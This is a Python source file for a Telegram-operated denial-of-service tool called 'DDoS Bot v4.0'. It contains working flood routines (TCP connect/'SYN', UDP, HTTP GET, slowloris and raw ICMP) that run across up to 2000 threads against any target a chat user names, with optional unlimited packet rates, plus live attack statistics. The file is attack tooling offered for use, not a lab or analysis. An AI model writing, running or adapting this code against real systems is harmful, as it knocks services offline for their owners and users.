#!/usr/bin/env python3
"""
🔥 DDoS Bot v4.0 - Enhanced Multi-Protocol Attack Engine
Real-time stats, faster workers, instant launch
"""

import os
import json
import logging
import threading
import time
import socket
import requests
import asyncio
import struct
import random
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, jsonify
from concurrent.futures import ThreadPoolExecutor, as_completed

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
PORT = int(os.getenv("PORT", 10000))

if not TELEGRAM_BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_BOT_TOKEN required")

MEMORY_FILE = "bot_memory.json"
app = Flask(__name__)

# ============================================================================
# MEMORY & STATS
# ============================================================================

class BotMemory:
    @staticmethod
    def load():
        if Path(MEMORY_FILE).exists():
            try:
                with open(MEMORY_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save(data):
        try:
            with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except:
            pass
    
    @staticmethod
    def get_user(user_id):
        memory = BotMemory.load()
        return memory.get(str(user_id), {
            "attacks": 0,
            "packets_sent": 0,
            "total_duration": 0,
            "favorite_target": None,
            "favorite_type": None,
        })
    
    @staticmethod
    def update_user(user_id, data):
        memory = BotMemory.load()
        memory[str(user_id)] = data
        BotMemory.save(memory)

class StatsCollector:
    def __init__(self):
        self.lock = threading.Lock()
        self.metrics = {
            "total_packets": 0,
            "total_bytes": 0,
            "concurrent_attacks": 0,
            "attacks_completed": 0,
            "uptime_start": time.time(),
            "peak_pps": 0,
            "current_pps": 0
        }
    
    def log_packets(self, count, size=0):
        with self.lock:
            self.metrics["total_packets"] += count
            self.metrics["total_bytes"] += size
            pps = self.metrics["total_packets"] / max(time.time() - self.metrics["uptime_start"], 1)
            if pps > self.metrics["peak_pps"]:
                self.metrics["peak_pps"] = pps
            self.metrics["current_pps"] = pps
    
    def inc_concurrent(self):
        with self.lock:
            self.metrics["concurrent_attacks"] += 1
    
    def dec_concurrent(self):
        with self.lock:
            self.metrics["concurrent_attacks"] = max(0, self.metrics["concurrent_attacks"] - 1)
            self.metrics["attacks_completed"] += 1
    
    def get_stats(self):
        with self.lock:
            uptime = time.time() - self.metrics["uptime_start"]
            return {
                **self.metrics,
                "uptime_seconds": int(uptime),
                "avg_pps": int(self.metrics["total_packets"] / max(uptime, 1))
            }

stats = StatsCollector()

# ============================================================================
# ATTACK ENGINE - FAST WORKERS
# ============================================================================

class FastAttackEngine:
    def __init__(self):
        self.active_attacks = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=2000)
    
    def raw_syn_flood(self, target_ip: str, target_port: int, user_id: int, duration: int, pps_limit: int):
        """Raw TCP SYN flood - fastest worker"""
        start_time = time.time()
        packets = 0
        
        while time.time() - start_time < duration:
            with self.lock:
                if user_id not in self.active_attacks:
                    return
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.05)
                sock.connect_ex((target_ip, target_port))
                try:
                    sock.close()
                except:
                    pass
                
                packets += 1
                stats.log_packets(1)
                
                if packets % 100 == 0:
                    with self.lock:
                        if user_id in self.active_attacks:
                            self.active_attacks[user_id]['packets'] = packets
                
                if pps_limit > 0:
                    time.sleep(1.0 / max(pps_limit, 1))
                else:
                    time.sleep(0.0001)
            except:
                pass
        
        return packets
    
    def raw_udp_flood(self, target_ip: str, target_port: int, user_id: int, duration: int, pps_limit: int):
        """Raw UDP flood - high volume"""
        start_time = time.time()
        packets = 0
        
        while time.time() - start_time < duration:
            with self.lock:
                if user_id not in self.active_attacks:
                    return
            
            try:
                payload = os.urandom(random.randint(256, 1024))
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
                
                packets += 1
                stats.log_packets(1, len(payload))
                
                if packets % 50 == 0:
                    with self.lock:
                        if user_id in self.active_attacks:
                            self.active_attacks[user_id]['packets'] = packets
                
                if pps_limit > 0:
                    time.sleep(1.0 / max(pps_limit, 1))
            except:
                pass
        
        return packets
    
    def raw_http_flood(self, target_host: str, target_port: int, user_id: int, duration: int, pps_limit: int):
        """HTTP GET flood - application layer"""
        try:
            target_ip = socket.gethostbyname(target_host)
        except:
            return 0
        
        start_time = time.time()
        packets = 0
        paths = ["/", "/index.html", "/api", "/login", "/admin"]
        
        while time.time() - start_time < duration:
            with self.lock:
                if user_id not in self.active_attacks:
                    return
            
            try:
                path = random.choice(paths)
                request = (
                    f"GET {path} HTTP/1.0\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.sendall(request)
                sock.close()
                
                packets += 1
                stats.log_packets(1, len(request))
                
                if packets % 20 == 0:
                    with self.lock:
                        if user_id in self.active_attacks:
                            self.active_attacks[user_id]['packets'] = packets
                
                if pps_limit > 0:
                    time.sleep(1.0 / max(pps_limit, 1))
            except:
                pass
        
        return packets
    
    def slowloris_attack(self, target_host: str, target_port: int, user_id: int, duration: int, connections: int):
        """Slowloris - hold connections open"""
        try:
            target_ip = socket.gethostbyname(target_host)
        except:
            return 0
        
        sockets = []
        start_time = time.time()
        
        for _ in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(60)
                sock.connect((target_ip, target_port))
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Connection: keep-alive\r\n"
                ).encode()
                sock.sendall(request)
                sockets.append(sock)
                stats.log_packets(1)
            except:
                pass
        
        while time.time() - start_time < duration:
            with self.lock:
                if user_id not in self.active_attacks:
                    break
            
            try:
                for sock in sockets:
                    try:
                        sock.sendall(b"X-a: b\r\n")
                    except:
                        pass
                time.sleep(15)
            except:
                pass
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        return len(sockets)
    
    def icmp_flood(self, target_ip: str, user_id: int, duration: int):
        """ICMP Echo (Ping) flood"""
        start_time = time.time()
        packets = 0
        
        while time.time() - start_time < duration:
            with self.lock:
                if user_id not in self.active_attacks:
                    return
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = b'X' * 32
                sock.sendto(payload, (target_ip, 0))
                sock.close()
                
                packets += 1
                stats.log_packets(1, 32)
                
                if packets % 100 == 0:
                    with self.lock:
                        if user_id in self.active_attacks:
                            self.active_attacks[user_id]['packets'] = packets
            except:
                pass
        
        return packets
    
    def start_attack(self, user_id: int, target: str, attack_type: str, threads: int = 500, duration: int = 60, pps_limit: int = 0):
        """Launch attack - instant activation"""
        try:
            # Parse target
            if ':' in target:
                target_host, port_str = target.rsplit(':', 1)
                try:
                    target_port = int(port_str)
                except:
                    target_port = 80 if attack_type == 'http' else 53
            else:
                target_host = target
                target_port = 80 if attack_type == 'http' else 53
            
            # DNS resolve
            try:
                target_ip = socket.gethostbyname(target_host)
            except socket.gaierror:
                return False, "❌ DNS resolution failed"
            
            # Register attack
            with self.lock:
                self.active_attacks[user_id] = {
                    'target': target_host,
                    'ip': target_ip,
                    'port': target_port,
                    'type': attack_type,
                    'active': True,
                    'packets': 0,
                    'start_time': time.time(),
                    'threads': threads,
                    'duration': duration,
                    'future_threads': []
                }
                stats.inc_concurrent()
            
            # Worker map
            worker_map = {
                'syn': self.raw_syn_flood,
                'udp': self.raw_udp_flood,
                'http': self.raw_http_flood,
                'slowloris': self.slowloris_attack,
                'icmp': self.icmp_flood,
            }
            
            if attack_type not in worker_map:
                return False, "❌ Invalid type: syn|udp|http|slowloris|icmp"
            
            worker = worker_map[attack_type]
            
            # Launch workers
            for i in range(threads):
                if attack_type == 'http':
                    future = self.executor.submit(worker, target_host, target_port, user_id, duration, pps_limit)
                elif attack_type == 'slowloris':
                    future = self.executor.submit(worker, target_host, target_port, user_id, duration, max(1, threads // 10))
                elif attack_type == 'icmp':
                    future = self.executor.submit(worker, target_ip, user_id, duration)
                else:
                    future = self.executor.submit(worker, target_ip, target_port, user_id, duration, pps_limit)
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['future_threads'].append(future)
            
            # Auto-stop timer
            def auto_stop():
                time.sleep(duration)
                self.stop_attack(user_id)
            
            threading.Thread(target=auto_stop, daemon=True).start()
            
            msg = (
                f"🔥 *STRIKE ACTIVE*\n\n"
                f"🎯 Target: `{target_host}:{target_port}`\n"
                f"⚔️ Type: `{attack_type.upper()}`\n"
                f"🧵 Threads: `{threads}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"📤 PPS Limit: `{pps_limit if pps_limit > 0 else 'UNLIMITED'}`"
            )
            
            logger.info(f"🔥 [{user_id}] Attack START: {target_host}:{target_port} {attack_type} {threads}t {duration}s")
            return True, msg
        
        except Exception as e:
            logger.error(f"Attack start error: {e}")
            return False, f"❌ Error: {str(e)}"
    
    def stop_attack(self, user_id: int):
        """Stop attack"""
        with self.lock:
            if user_id not in self.active_attacks:
                return False, {}
            
            attack = self.active_attacks[user_id]
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            
            # Cancel futures
            for future in attack.get('future_threads', []):
                try:
                    future.cancel()
                except:
                    pass
            
            del self.active_attacks[user_id]
            stats.dec_concurrent()
            
            logger.info(f"🛑 [{user_id}] Attack STOP: {packets} packets in {duration:.1f}s ({int(packets/max(duration, 1))} pps)")
            return True, {'packets': packets, 'duration': duration}
    
    def get_status(self, user_id: int):
        """Get live attack status"""
        with self.lock:
            if user_id not in self.active_attacks:
                return {'active': False}
            
            attack = self.active_attacks[user_id]
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            pps = int(packets / max(duration, 1))
            
            return {
                'active': True,
                'target': attack['target'],
                'port': attack['port'],
                'type': attack['type'],
                'packets': packets,
                'duration': int(duration),
                'pps': pps,
                'threads': attack['threads']
            }

engine = FastAttackEngine()

# ============================================================================
# REALTIME STATS LOGGER
# ============================================================================

def stats_logger_thread():
    """Log stats every 5 seconds to terminal"""
    while True:
        try:
            time.sleep(5)
            s = stats.get_stats()
            
            print("\n" + "="*80)
            print(f"⚡ STATS [{datetime.now().strftime('%H:%M:%S')}]")
            print("="*80)
            print(f"📊 Total Packets: {s['total_packets']:,} | "
                  f"Total Bytes: {s['total_bytes']:,} | "
                  f"Avg PPS: {s['avg_pps']:,}")
            print(f"🔴 Active Attacks: {s['concurrent_attacks']} | "
                  f"Completed: {s['attacks_completed']} | "
                  f"Peak PPS: {int(s['peak_pps']):,}")
            print(f"⏱️  Uptime: {s['uptime_seconds']}s")
            print("="*80 + "\n")
        except:
            pass

threading.Thread(target=stats_logger_thread, daemon=True).start()

# ============================================================================
# FLASK ENDPOINTS
# ============================================================================

@app.route('/', methods=['GET'])
def health():
    s = stats.get_stats()
    return jsonify({
        'status': 'running',
        'bot': 'DDoS Bot v4.0',
        'timestamp': datetime.now().isoformat(),
        **s
    }), 200

@app.route('/stats', methods=['GET'])
def get_stats_endpoint():
    return jsonify(stats.get_stats()), 200

# ============================================================================
# TELEGRAM BOT
# ============================================================================

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
    
    def get_updates(self):
        try:
            url = f"{self.base_url}/getUpdates"
            resp = requests.post(url, json={"offset": self.offset, "timeout": 30}, timeout=35)
            data = resp.json()
            if data.get('ok'):
                return data.get('result', [])
        except Exception as e:
            logger.error(f"Get updates error: {e}")
        return []
    
    def send_message(self, chat_id, text, parse_mode="Markdown"):
        try:
            url = f"{self.base_url}/sendMessage"
            requests.post(url, json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode
            }, timeout=10)
        except Exception as e:
            logger.error(f"Send message error: {e}")
    
    def send_menu(self, chat_id):
        try:
            url = f"{self.base_url}/sendMessage"
            requests.post(url, json={
                "chat_id": chat_id,
                "text": "🔥 *DDoS Bot v4.0*\n\nMulti-Protocol Attack Engine\n\n*Available:*\n• syn | udp | http | slowloris | icmp",
                "parse_mode": "Markdown",
                "reply_markup": {
                    "inline_keyboard": [
                        [{"text": "🎯 Attack", "callback_data": "attack_menu"},
                         {"text": "📊 Status", "callback_data": "status"}],
                        [{"text": "🛑 Stop", "callback_data": "stop"},
                         {"text": "ℹ️ Help", "callback_data": "help"}]
                    ]
                }
            }, timeout=10)
        except Exception as e:
            logger.error(f"Send menu error: {e}")
    
    def handle_update(self, update):
        if 'message' in update:
            self.handle_message(update['message'])
        elif 'callback_query' in update:
            self.handle_callback(update['callback_query'])
        
        self.offset = update.get('update_id', 0) + 1
    
    def handle_message(self, message):
        chat_id = message['chat']['id']
        text = message.get('text', '').strip()
        user_id = message['from']['id']
        
        if text == '/start':
            self.send_menu(chat_id)
        
        elif text == '/status':
            status = engine.get_status(user_id)
            if status['active']:
                msg = (f"🔥 *LIVE*\n"
                       f"🎯 `{status['target']}:{status['port']}`\n"
                       f"⚔️ `{status['type'].upper()}`\n"
                       f"📤 `{status['packets']:,}` packets @ `{status['pps']:,}` pps\n"
                       f"⏱️ `{status['duration']}s`")
            else:
                msg = "❌ No active attack"
            self.send_message(chat_id, msg)
        
        elif text == '/stop':
            success, stats_data = engine.stop_attack(user_id)
            if success:
                msg = f"🛑 *Stopped*\n📤 `{stats_data.get('packets', 0):,}` packets"
            else:
                msg = "❌ No active attack"
            self.send_message(chat_id, msg)
        
        elif text.startswith('/attack '):
            parts = text[8:].split()
            if len(parts) < 2:
                self.send_message(chat_id, "*Format:*\n`/attack target type [threads] [duration] [pps_limit]`\n\n*Example:*\n`/attack target.com udp 1000 60 0`")
                return
            
            target = parts[0]
            attack_type = parts[1].lower()
            threads = int(parts[2]) if len(parts) > 2 else 500
            duration = int(parts[3]) if len(parts) > 3 else 60
            pps_limit = int(parts[4]) if len(parts) > 4 else 0
            
            success, msg = engine.start_attack(user_id, target, attack_type, threads, duration, pps_limit)
            self.send_message(chat_id, msg)
    
    def handle_callback(self, callback):
        chat_id = callback['message']['chat']['id']
        data = callback['data']
        user_id = callback['from']['id']
        
        if data == "attack_menu":
            self.send_message(chat_id, "*Send target:*\n`target.com` or `192.168.1.1:8080`\n\n*Then command:*\n`/attack target.com udp 500 60`")
        elif data == "status":
            status = engine.get_status(user_id)
            if status['active']:
                msg = (f"🔥 *LIVE*\n"
                       f"🎯 `{status['target']}`\n"
                       f"📤 `{status['packets']:,}` pps: `{status['pps']:,}`")
            else:
                msg = "❌ Idle"
            self.send_message(chat_id, msg)
        elif data == "stop":
            success, _ = engine.stop_attack(user_id)
            msg = "🛑 Stopped" if success else "❌ Nothing running"
            self.send_message(chat_id, msg)
        elif data == "help":
            self.send_message(chat_id, "*Protocols:*\n`syn | udp | http | slowloris | icmp`\n\n*/attack target type threads duration pps_limit*")
    
    def run(self):
        logger.info("🚀 Bot polling started")
        while True:
            try:
                updates = self.get_updates()
                for update in updates:
                    self.handle_update(update)
                time.sleep(0.05)
            except Exception as e:
                logger.error(f"Bot error: {e}")
                time.sleep(5)

def start_bot_polling():
    bot = TelegramBot(TELEGRAM_BOT_TOKEN)
    thread = threading.Thread(target=bot.run, daemon=True)
    thread.start()

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    start_bot_polling()
    
    logger.info(f"🚀 Flask server on 0.0.0.0:{PORT}")
    logger.info("🔥 DDoS Bot v4.0 - ONLINE")
    logger.info("Protocols: syn, udp, http, slowloris, icmp")
    
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
